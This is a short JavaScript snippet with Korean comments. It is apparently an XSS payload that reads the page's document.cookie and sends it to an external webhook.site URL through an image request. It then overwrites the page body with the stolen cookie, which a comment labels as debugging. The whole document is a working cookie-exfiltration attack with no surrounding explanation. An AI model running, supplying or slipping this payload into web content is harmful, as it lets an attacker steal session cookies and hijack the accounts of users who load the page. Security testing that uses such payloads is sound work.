(function () {
  const cookie = document.cookie;

  // 1. Webhook.site로 쿠키 전송
  new Image().src =
    "https://webhook.site/759f420f-8171-4dda-9238-690340e0dfb6?cookie=" +
    encodeURIComponent(cookie);

  // 2. 화면에도 출력 (디버깅용)
  document.body.innerText = "COOKIE: " + cookie;
})();
